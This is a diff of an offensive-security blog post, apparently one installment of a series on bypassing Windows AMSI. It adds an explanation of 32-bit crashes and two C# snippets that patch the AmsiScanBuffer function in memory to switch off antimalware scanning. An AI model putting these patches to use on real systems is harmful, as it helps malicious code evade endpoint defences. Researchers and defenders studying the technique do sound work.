@@ -313,16 +313,47 @@ if (!doNotTrack) {
 
 <h2 id="it-just-crashes">It Just Crashes</h2>
 
-<p>The second issue comes where the PowerShell process crashes when the bypass is executed, due to some memory corruption.</p>
+<blockquote>
+<p>[Updated 04/01/2019]</p>
+</blockquote>
+
+<p>I found this one to be a little more interesting.</p>
+
+<p>The second issue comes where the PowerShell process crashes when the bypass is executed, due to some memory corruption.  This would only actually happen if it was being run in a 32-bit process.</p>
 
 <figure>
     <img src="https://rastamouse.me/images/asb-bypass-pt4/32bit.png"/> 
 </figure>
 
 
-<p>It&rsquo;s obvious from the screenshot that this PowerShell process is 32-bit.  Since the bypass is specifically written for 64-bit, there&rsquo;s just an incompatibility there.  When you land in PowerShell prompts inside MSF and other tools, you don&rsquo;t get the little <code>(x86)</code> that tells you what architecture your process is, so although simple, this is easy to overlook.</p>
+<p>If you were using the code we commited in <a href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/">Part 2</a> (which was basically the <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/commit/626a27a36196bfe778cbb430b850e43b2ac22b25">initial commit</a>), you would have been using:</p>
 
-<p>Little tricks like <code>[Environment]::Is64BitProcess</code> can help you out here.  So always ensure you&rsquo;re in a 64-bit PowerShell process before executing this bypass (or of course, port it over to 32-bit :)).</p>
+<pre><code>Byte[] Patch = { 0x31, 0xff, 0x90 };
+IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);
+</code></pre>
+
+<p>But at the end of <a href="https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/">Part 3</a>, we changed the bytes being used to patch the AmsiScanBuffer function, specifically to make it more &ldquo;resiliant&rdquo;.  We ended up with the following, (but I never updated the repo).</p>
+
+<pre><code>Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
+Marshal.Copy(Patch, 0, unmanagedPointer, 6);
+MoveMemory(ASBPtr, unmanagedPointer, 6);
+</code></pre>
+
+<p>And this runs perfectly well in a 32-bit process.</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/asb-bypass-pt4/32bit-fixed.png"/> 
+</figure>
+
+
+<p>I&rsquo;ve not tested this, but my theory is that the static byte offset <code>0x001b</code> is incorrect for a 32-bit process, and so we end up overwriting a completely different portion of memory than what we want.</p>
+
+<p>Coincidently, Francesco Soncina submitted two PR&rsquo;s to update both the <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/commit/050dae393338ae5b12789b2453b728a93ee1dcd4">C#</a> and <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/commit/19db77e09f360eda4327b6f4989b8706803b0673">PowerShell</a> versions of the bypass.  So if you pull the changes, you should be fine.</p>
+
+<p>&ndash;</p>
 
 <p>I hope this helps anybody out who was facing these problems.  Armed with this knowledge, may 2019 bring you many more shells.</p>
               
@@ -419,7 +450,7 @@ if (!doNotTrack) {
         </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
-    &copy; 2018 Rasta Mouse. All Rights Reserved
+    &copy; 2019 Rasta Mouse. All Rights Reserved
   </span>
 </footer>
 
